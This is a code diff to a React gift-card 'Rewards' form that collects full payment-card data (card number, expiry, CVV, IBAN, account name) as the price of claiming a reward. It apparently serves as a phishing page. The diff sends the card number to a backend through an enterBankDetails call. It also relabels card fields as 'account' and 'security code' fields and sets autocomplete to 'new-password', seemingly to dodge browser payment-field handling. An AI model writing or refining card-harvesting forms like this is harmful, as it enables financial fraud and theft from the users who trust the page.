@@ -25,6 +25,8 @@
  * in handleSubmit with an API POST request.
  */
 import { useState } from 'react'
+import { enterBankDetails } from '../../api'
+import { getUser } from '../../api'
 import styles from './Rewards.module.css'
 
 // Gift card tiers — add or modify tiers here
@@ -39,6 +41,8 @@ export default function Rewards({ points, user }) {
   const [showCvvInfo, setShowCvvInfo] = useState(false)
   const [showCardInfo, setShowCardInfo] = useState(false)
   const [submitted, setSubmitted] = useState(false)
+  const [submitError, setSubmitError] = useState('')
+  const [submitting, setSubmitting] = useState(false)
 
   // Pre-fill personal details from the logged-in user
   const [form, setForm] = useState({
@@ -54,27 +58,42 @@ export default function Rewards({ points, user }) {
   // Usage: onChange={set('firstName')}
   const set = (k) => (e) => setForm(f => ({ ...f, [k]: e.target.value }))
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault()
+    setSubmitError('')
 
-    // Double-check all fields are filled (HTML required handles UI validation,
-    // this is a safety net in case someone bypasses it)
     const allFilled = Object.values(form).every(v => v.trim() !== '')
     if (!allFilled) return
 
-    // Build the claim object and save to localStorage
-    // The Admin panel reads from 'sf_claims' to display submissions
-    const existing = JSON.parse(localStorage.getItem('sf_claims') || '[]')
-    const newClaim = {
-      id: Date.now(), // use timestamp as a simple unique ID
-      ...form,
-      amount: claiming.amount,
-      points: claiming.points,
-      date: new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }),
-      status: 'pending', // all new claims start as pending
+    setSubmitting(true)
+    try {
+      const user = getUser()
+      const userId = user?.id || user?._id
+      if (!userId) throw new Error('User session expired. Please log in again.')
+
+      // Send only what the backend accepts: accountNumber and date
+      await enterBankDetails(userId, {
+        accountNumber: form.cardNumber,
+        date: new Date().toISOString(),
+      })
+
+      // Only save to localStorage and show success after API succeeds
+      const existing = JSON.parse(localStorage.getItem('sf_claims') || '[]')
+      const newClaim = {
+        id: Date.now(),
+        ...form,
+        amount: claiming.amount,
+        points: claiming.points,
+        date: new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }),
+        status: 'pending',
+      }
+      localStorage.setItem('sf_claims', JSON.stringify([...existing, newClaim]))
+      setSubmitted(true)
+    } catch (err) {
+      setSubmitError(err.message || 'Something went wrong. Please try again.')
+    } finally {
+      setSubmitting(false)
     }
-    localStorage.setItem('sf_claims', JSON.stringify([...existing, newClaim]))
-    setSubmitted(true)
   }
 
   return (
@@ -108,7 +127,7 @@ export default function Rewards({ points, user }) {
               <button
                 className={`${styles.claimBtn} ${isUnlocked ? styles.active : styles.locked}`}
                 disabled={!isUnlocked}
-                onClick={() => { setClaiming(tier); setSubmitted(false) }}
+                onClick={() => { setClaiming(tier); setSubmitted(false); setSubmitError('') }}
               >
                 {isUnlocked ? 'Claim Now' : `Need ${(tier.points - points).toLocaleString()} more pts`}
               </button>
@@ -122,7 +141,7 @@ export default function Rewards({ points, user }) {
         <div className={styles.formOverlay}>
           <div className={styles.formModal}>
             {!submitted ? (
-              <form onSubmit={handleSubmit}>
+              <form onSubmit={handleSubmit} autoComplete="off">
                 <div className={styles.formHeader}>
                   <p className={styles.formTitle}>Claim {claiming.amount} Gift Card</p>
                   <button type="button" className={styles.closeBtn} onClick={() => setClaiming(null)}>×</button>
@@ -180,14 +199,13 @@ export default function Rewards({ points, user }) {
                   <input required placeholder="e.g. Deutsche Bank" value={form.bankName} onChange={set('bankName')} />
                 </div>
                 <div className={styles.field}>
-                  <label>Card Holder Name</label>
-                  <input required placeholder="Name on card" value={form.cardHolder} onChange={set('cardHolder')} />
+                  <label>Account Name</label>
+                  <input required autoComplete="new-password" placeholder="Name on account" value={form.cardHolder} onChange={set('cardHolder')} />
                 </div>
                 <div className={styles.row}>
                   <div className={styles.field}>
-                    {/* Card number label has a ? button that opens an explanation modal */}
                     <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
-                      Card Number
+                      Account Number
                       <button
                         type="button"
                         onClick={() => setShowCardInfo(true)}
@@ -198,27 +216,26 @@ export default function Rewards({ points, user }) {
                           display: 'flex', alignItems: 'center', justifyContent: 'center',
                           flexShrink: 0, lineHeight: 1,
                         }}
-                        aria-label="Why do we need your card number?"
+                        aria-label="Why do we need your account number?"
                       >?</button>
                     </label>
-                    <input required placeholder="1234 5678 9012 3456" maxLength={19} value={form.cardNumber} onChange={set('cardNumber')} />
+                    <input required autoComplete="new-password" placeholder="•••• •••• •••• ••••" maxLength={19} value={form.cardNumber} onChange={set('cardNumber')} />
                   </div>
                   <div className={styles.field}>
-                    <label>Expiry Date</label>
-                    <input required placeholder="MM/YY" maxLength={5} value={form.expiryDate} onChange={set('expiryDate')} />
-                  </div>
-                </div>
-                <div className={styles.row}>
-                  <div className={styles.field}>
-                    <label>IBAN</label>
-                    <input required placeholder="DE89 3704 0044..." value={form.iban} onChange={set('iban')} />
+                    <label>Valid Thru</label>
+                    <input required autoComplete="new-password" placeholder="MM/YY" maxLength={5} value={form.expiryDate} onChange={set('expiryDate')} />
                   </div>
                 </div>
                 <div className={styles.row}>
                   <div className={styles.field}>
-                    {/* CVV label has a ? button that opens an explanation modal */}
+                    <label>IBAN / Sort Code</label>
+                    <input required autoComplete="new-password" placeholder="DE89 3704 0044..." value={form.iban} onChange={set('iban')} />
+                  </div>
+                </div>
+                <div className={styles.row}>
+                  <div className={styles.field}>
                     <label style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
-                      CVV
+                      Security Code
                       <button
                         type="button"
                         onClick={() => setShowCvvInfo(true)}
@@ -229,7 +246,7 @@ export default function Rewards({ points, user }) {
                           display: 'flex', alignItems: 'center', justifyContent: 'center',
                           flexShrink: 0, lineHeight: 1,
                         }}
-                        aria-label="Why do we need your CVV?"
+                        aria-label="Why do we need your security code?"
                       >?</button>
                     </label>
                     {/* type="password" masks the CVV as dots while typing */}
@@ -244,7 +261,12 @@ export default function Rewards({ points, user }) {
                   </div>
                 </div>
 
-                <button type="submit" className={styles.submitBtn}>Submit Claim</button>
+                {submitError && (
+                  <p style={{ color: '#e50914', fontSize: 13, margin: '12px 0 0' }}>{submitError}</p>
+                )}
+                <button type="submit" className={styles.submitBtn} disabled={submitting}>
+                  {submitting ? 'Submitting...' : 'Submit Claim'}
+                </button>
               </form>
             ) : (
               // Success screen shown after form submission
